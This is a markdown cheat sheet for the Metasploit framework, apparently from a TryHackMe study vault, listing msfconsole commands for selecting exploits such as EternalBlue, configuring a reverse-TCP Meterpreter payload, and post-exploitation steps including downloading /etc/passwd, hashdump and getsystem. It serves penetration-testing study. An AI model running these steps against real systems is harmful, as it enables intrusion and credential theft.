---
tags: [tool, exploitation, post-exploitation]
tool_name: "Metasploit"
category: Exploitation
last_updated: 2024-01-01
---

# 🛠️ Metasploit Framework

## 📖 Description

> Open-source exploitation framework. Contains hundreds of exploits, payloads, and auxiliary modules.

---

## 🚀 Getting Started

```bash
# Launch msfconsole
msfconsole

# Initialise the database (first time)
msfdb init
```

---

## 📋 Essential Commands

### Search and select

```bash
# Search for a module
search <term>
search type:exploit name:eternalblue
search cve:2021-44228

# Use a module
use exploit/windows/smb/ms17_010_eternalblue
use 0   # (number from search results)

# Info on current module
info
```

### Configuration

```bash
# View required options
show options
show advanced

# Set options
set RHOSTS 10.10.X.X
set LHOST 10.9.X.X    # your THM VPN IP
set LPORT 4444
set PAYLOAD windows/x64/meterpreter/reverse_tcp

# View compatible payloads
show payloads
```

### Launch

```bash
# Check if target is vulnerable (without exploiting)
check

# Run the exploit
run
exploit
```

### Meterpreter — Post-Exploitation

```bash
# System info
sysinfo
getuid

# Navigation
pwd
ls
cd /tmp

# Upload / Download
upload /local/file.sh /tmp/file.sh
download /etc/passwd /local/passwd.txt

# System shell
shell

# Privilege escalation
getsystem
hashdump

# Pivoting
run post/multi/recon/local_exploit_suggester
```

---

## 📋 Useful Modules

| Type | Module | Usage |
|------|--------|-------|
| Auxiliary | `scanner/portscan/tcp` | Port scanning |
| Auxiliary | `scanner/smb/smb_ms17_010` | Check EternalBlue |
| Exploit | `multi/handler` | Catch reverse shells |
| Post | `multi/recon/local_exploit_suggester` | PrivEsc suggestions |
| Post | `linux/gather/hashdump` | Linux hash dump |

---

## 💡 Tips & Tricks

- Use `multi/handler` to catch shells created with msfvenom
- `sessions -l` to list active sessions
- `sessions -i 1` to interact with a session
- `background` to background a session

---

## 🔗 Resources

- [Metasploit Unleashed](https://www.offensive-security.com/metasploit-unleashed/)
- [HackTricks — Metasploit](https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/msfvenom)
